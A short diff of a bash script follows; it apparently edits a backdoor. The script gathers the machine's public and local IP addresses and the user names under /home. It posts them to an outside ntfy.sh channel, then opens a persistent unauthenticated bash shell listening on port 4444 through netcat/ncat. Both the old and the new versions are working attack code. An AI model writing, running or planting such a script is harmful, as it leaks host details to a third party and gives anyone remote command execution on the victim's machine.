@@ -1,9 +1,9 @@
-#!/bin/bash
+#!/bin/bash       
 
 pubip=$(curl "ifconfig.me")
 localip=$(hostname -I)
 who=$(ls /home)
 
-curl -d "My name is ($who) and my local ip is ($localip) and my Public IPv4 is($pubip) " ntfy.sh/cp_cacc_netcat
+curl -d "My name is ($who) and my local ip is ($localip) and my Public IPv4 is ($pubip) " ntfy.sh/cp_cacc_netcat
 
-nc.traditional -le /bin/bash -p 4444
+ncat -l 4444 -c '/bin/bash' --keep-open
